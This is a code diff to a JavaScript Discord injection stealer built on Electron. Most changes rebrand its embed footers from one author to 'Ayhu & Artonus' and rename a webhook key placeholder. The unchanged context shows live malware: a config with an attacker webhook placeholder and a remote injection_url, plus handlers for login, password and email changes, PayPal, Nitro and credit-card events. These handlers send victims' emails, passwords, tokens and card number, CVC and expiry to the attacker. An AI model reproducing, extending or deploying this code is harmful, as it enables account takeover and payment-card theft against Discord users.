@@ -7,11 +7,11 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%SAKSO%', 
-  webhook_protector_key: '%SAKSO_KEY%', 
+  webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'wentrafud', 
+  embed_name: 'wentra', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/lawrensxrq/wentra-fud/main/index.js', 
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・wentra fud amde by lawrens',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・wentra fud amde by lawrens',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・wentra fud amde by lawrens',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・wentra fud amde by lawrens',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -829,7 +829,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         fields: [
           {
             name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCr3dit C4rd Expiration: **${expir_month}/${expir_year}**`,
+            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
@@ -848,8 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・wentra fud amde by lawrens
-            ',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -893,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・wentra fud amde by lawrens',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
